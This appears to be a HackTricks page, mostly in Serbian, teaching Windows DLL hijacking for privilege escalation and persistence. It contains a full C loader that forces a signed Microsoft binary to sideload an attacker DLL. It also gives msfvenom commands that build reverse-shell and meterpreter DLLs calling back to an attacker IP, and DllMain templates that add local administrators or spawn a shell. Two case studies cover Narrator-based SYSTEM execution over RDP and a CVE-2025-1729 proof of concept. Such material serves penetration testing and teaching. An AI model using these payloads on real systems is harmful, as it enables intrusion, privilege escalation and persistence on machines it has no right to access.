# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Osnovne informacije

DLL Hijacking podrazumeva manipulaciju pouzdane aplikacije da učita zlonamerni DLL. Ovaj pojam obuhvata više taktika poput **DLL Spoofing, Injection, and Side-Loading**. Koristi se pretežno za izvršavanje koda, postizanje persistence, i ređe za privilege escalation. Iako se ovde fokusiramo na escalation, metod hijack-ovanja ostaje isti za sve ciljeve.

### Uobičajene tehnike

Koriste se različite metode za DLL hijacking, a njihova efikasnost zavisi od strategije učitavanja DLL-a u aplikaciji:

1. **DLL Replacement**: Zamena legitimnog DLL-a zlonamernim, opcionalno koristeći DLL Proxying da se sačuva funkcionalnost originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje zlonamernog DLL-a u putanju pre legitimnog, iskorišćavajući obrazac pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje zlonamernog DLL-a za koji aplikacija misli da predstavlja nepostojeći neophodni DLL.
4. **DLL Redirection**: Izmena parametara pretrage kao što su %PATH% ili fajlovi .exe.manifest / .exe.local da se aplikaciju usmeri na zlonamerni DLL.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a zlonamernim u WinSxS direktorijumu, metod često povezan sa DLL side-loading.
6. **Relative Path DLL Hijacking**: Postavljanje zlonamernog DLL-a u direktorijum pod kontrolom korisnika zajedno sa kopijom aplikacije, što podseća na Binary Proxy Execution tehnike.

## Pronalaženje nedostajućih Dlls

Najčešći način da se nađu nedostajući Dll-ovi u sistemu je pokretanje [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals, **podešavanjem** **sledeća 2 filtera**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

i samo prikažite **File System Activity**:

![](<../../../images/image (153).png>)

Ako tražite **nedostajuće dll-ove generalno**, ostavite ovo da radi nekoliko **sekundi**.\
Ako tražite **nedostajući dll unutar specifičnog izvršnog fajla**, treba da dodate **još jedan filter poput "Process Name" "contains" `<exec name>`, pokrenete ga i zaustavite snimanje događaja**.

## Exploiting Missing Dlls

Da bismo eskalirali privilegije, najbolja šansa je da možemo **upisati DLL koji će neki privilegovani proces pokušati da učita** na nekom od mesta gde će biti pretragan. Dakle, moći ćemo da **upisemo** DLL u **folder** koji se pretražuje pre foldera u kojem je originalni DLL (neobičan slučaj), ili ćemo moći da **upisemo u neki folder gde će se DLL tražiti**, a originalni **DLL ne postoji** ni u jednom folderu.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows aplikacije traže DLL-ove prateći niz **preddefinisanih putanja za pretragu**, u određenom redosledu. Problem DLL hijackinga nastaje kada je zlonamerni DLL strateški postavljen u jedan od tih direktorijuma tako da se učita pre autentničnog DLL-a. Rešenje je da aplikacija koristi apsolutne putanje prilikom referisanja potrebnih DLL-ova.

Možete videti **DLL search order on 32-bit** sistema ispod:

1. Direktorijum iz kojeg je aplikacija učitana.
2. System directory. Koristite [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) funkciju da dobijete putanju ovog direktorijuma. (_C:\Windows\System32_)
3. 16-bit system directory. Ne postoji funkcija koja vraća putanju ovog direktorijuma, ali se pretražuje. (_C:\Windows\System_)
4. Windows directory. Koristite [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) funkciju da dobijete putanju ovog direktorijuma.
1. (_C:\Windows_)
5. Trenutni direktorijum.
6. Direktorijumi navedeni u PATH environment varijabli. Imajte na umu da ovo ne uključuje per-application putanju specificiranu kroz **App Paths** registry key. **App Paths** ključ se ne koristi pri računaju DLL search path-a.

To je **default** redosled pretrage sa omogućenim **SafeDllSearchMode**. Kada je on onemogućen, trenutni direktorijum prelazi na drugo mesto. Da onemogućite ovu funkciju, kreirajte vrednost registra **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i postavite je na 0 (podrazumevano je omogućeno).

Ako se [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) pozove sa **LOAD_WITH_ALTERED_SEARCH_PATH**, pretraga počinje u direktorijumu izvršnog modula koji **LoadLibraryEx** učitava.

Na kraju, imajte na umu da **DLL može biti učitan navođenjem apsolutne putanje umesto samo imena**. U tom slučaju taj DLL će **biti pretraživan samo u toj putanji** (ako taj DLL ima zavisnosti, one će se tražiti kao da su učitane po imenu).

Postoje i drugi načini da se izmeni redosled pretrage, ali ih ovde neću objašnjavati.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način da deterministički utičete na DLL search path novokreiranog procesa je postavljanje polja DllPath u RTL_USER_PROCESS_PARAMETERS prilikom kreiranja procesa koristeći ntdll-ove native API-je. Dodeljivanjem direktorijuma pod kontrolom napadača ovde, ciljnom procesu koji rešava importovani DLL po imenu (bez apsolutne putanje i bez korišćenja safe loading flag-ova) može se nametnuti da učita zlonamerni DLL iz tog direktorijuma.

Ključna ideja
- Sastavite process parameters sa RtlCreateProcessParametersEx i obezbedite custom DllPath koji pokazuje na folder pod vašom kontrolom (na primer direktorijum gde se nalazi vaš dropper/unpacker).
- Kreirajte proces sa RtlCreateUserProcess. Kada ciljni binarni fajl rešava DLL po imenu, loader će konsultovati ovaj prosleđeni DllPath tokom rezolucije, omogućavajući pouzdano sideloading čak i kada zlonamerni DLL nije kolociran sa ciljnim EXE.

Napomene/ograničenja
- Ovo utiče na child process koji se kreira; razlikuje se od SetDllDirectory, koji utiče samo na trenutni proces.
- Cilj mora importovati ili LoadLibrary DLL po imenu (bez apsolutne putanje i bez korišćenja LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardkodirane apsolutne putanje se ne mogu hijack-ovati. Forwarded exports i SxS mogu promeniti prioritet.

Minimalan C primer (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operativni primer upotrebe
- Postavite zlonamerni xmllite.dll (exporting the required functions or proxying to the real one) u vaš direktorijum DllPath.
- Pokrenite potpisani binarni fajl za koji je poznato da traži xmllite.dll po imenu koristeći gore navedenu tehniku. Loader resolves the import via the supplied DllPath and sideloads your DLL.

Ova tehnika je primećena in-the-wild da pokreće višestepene sideloading lance: početni launcher ostavi pomoćni DLL, koji potom spawn-uje Microsoft-potpisan, hijackable binarni fajl sa prilagođenim DllPath-om kako bi se forsiralo učitavanje napadačevog DLL-a iz staging directory.


#### Izuzeci u redosledu pretrage dll-ova iz Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Eskalacija privilegija

**Zahtevi**:

- Identifikujte proces koji radi ili će raditi pod **različitim privilegijama** (horizontalno ili lateralno kretanje), koji je **bez DLL-a**.
- Osigurajte da postoji **write access** za bilo koji **direktorijum** u kojem će se **DLL** **tražiti**. Ta lokacija može biti direktorijum izvršnog fajla ili direktorijum unutar system path-a.

Da, zahtevi su komplikovani za pronaći jer je **po defaultu prilično čudno pronaći privilegovani izvršni fajl kojem nedostaje dll** i još je **čudnije imati write permissions na folderu u system path-u** (po defaultu to ne možete). Međutim, u pogrešno konfigurisanim okruženjima to je moguće.\
U slučaju da imate sreće i ispunjavate zahteve, možete pogledati projekat [UACME](https://github.com/hfiref0x/UACME). Čak i ako je **glavni cilj projekta bypass UAC**, tamo možete naći **PoC** of a Dll hijaking za verziju Windows-a koju možete iskoristiti (verovatno samo menjajući putanju foldera gde imate write permissions).

Imajte na umu da možete **proveriti svoje permisije u folderu** radeći:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **proveri dozvole svih direktorijuma unutar PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Takođe možete proveriti imports izvršne executable datoteke i exports dll-a pomoću:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Za kompletan vodič kako da **iskoristite Dll Hijacking za eskalaciju privilegija** sa dozvolama za pisanje u **System Path folder** pogledajte:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Automatizovani alati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) će proveriti da li imate dozvole za pisanje u bilo koji folder unutar system PATH.\
Drugi interesantni automatizovani alati za otkrivanje ove ranjivosti su **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll_.

### Primer

U slučaju da pronađete iskoristiv scenario, jedna od najvažnijih stvari za uspešan exploit biće da **kreirate dll koji eksportuje bar sve funkcije koje će izvršni fajl importovati iz njega**. Imajte na umu da Dll Hijacking može biti koristan da [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili da se pređe [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Možete pronaći primer **kako kreirati validan dll** u ovoj studiji o dll hijackingu fokusiranoj na dll hijacking za izvršenje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Štaviše, u **next sectio**n možete pronaći neke **basic dll codes** koji mogu biti korisni kao **templates** ili za kreiranje **dll with non required functions exported**.

## **Kreiranje i kompajliranje Dlls**

### **Dll Proxifying**

U suštini, **Dll proxy** je Dll sposoban da **izvrši vaš zlonamerni kod kada se učita** ali i da **izlaže** i **radi** kao **očekivano** tako što preusmerava sve pozive na pravu biblioteku.

Sa alatom [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete zapravo **navesti izvršni fajl i izabrati biblioteku** koju želite proxify i **generisati proxified dll** ili **navesti Dll** i **generisati proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Dobijte meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreiraj korisnika (x86, nisam video x64 verziju):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Sopstveno

Obratite pažnju da u nekoliko slučajeva Dll koji kompajlirate mora **eksportovati više funkcija** koje će biti učitane od strane victim process; ako te funkcije ne postoje, **binary neće moći da ih učita** i **exploit će propasti**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL primer sa kreiranjem korisnika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternativni C DLL sa thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studija slučaja: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe i dalje proverava predvidljivu, po jeziku specifičnu localization DLL pri pokretanju koja može biti hijacked za arbitrary code execution i persistence.

Ključne činjenice
- Putanja provere (trenutne verzije): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Stara putanja (starije verzije): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ako na OneCore putanji postoji DLL pod kontrolom napadača koji je moguće upisati, on se učitava i `DllMain(DLL_PROCESS_ATTACH)` se izvršava. Eksporti nisu potrebni.

Otkrivanje uz Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Pokrenite Narrator i posmatrajte pokušaj učitavanja navedene putanje.

Minimalni DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Naivni hijack će govoriti/istaknuti UI. Da ostanete tihi, pri attach-u nabrojte Narrator thread-ove, otvorite glavni thread (`OpenThread(THREAD_SUSPEND_RESUME)`) i `SuspendThread`-ujte ga; nastavite u sopstvenom thread-u. Pogledajte PoC za kompletan kod.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Sa gore navedenim, pokretanje Narrator učitava ubačeni DLL. Na secure desktop (logon screen), pritisnite CTRL+WIN+ENTER da pokrenete Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- Možete klonirati ugrađeni Accessibility Tool (AT) registry unos (npr. CursorIndicator), izmeniti ga da pokazuje na proizvoljan binary/DLL, importovati ga, a zatim postaviti `configuration` na ime tog AT-a. Ovo omogućava proxy izvršenje proizvoljnog koda pod Accessibility framework-om.

Notes
- Pisanje u `%windir%\System32` i menjanje HKLM vrednosti zahteva admin prava.
- Cela payload logika može biti u `DLL_PROCESS_ATTACH`; export-i nisu potrebni.

## Studija slučaja: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ovaj slučaj demonstrira **Phantom DLL Hijacking** u Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), praćeno kao **CVE-2025-1729**.

### Detalji ranjivosti

- **Komponenta**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Implementacija exploita

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Tok napada

1. Kao standardni korisnik, postavite `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekajte da zakazani zadatak pokrene u 9:30 u kontekstu trenutnog korisnika.
3. Ako je administrator prijavljen kada se zadatak izvrši, maliciozni DLL će se pokrenuti u administratorskoj sesiji sa srednjim integritetom.
4. Povežite standardne UAC bypass tehnike da biste podigli privilegije sa srednjeg integriteta na SYSTEM.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)


{{#include ../../../banners/hacktricks-training.md}}
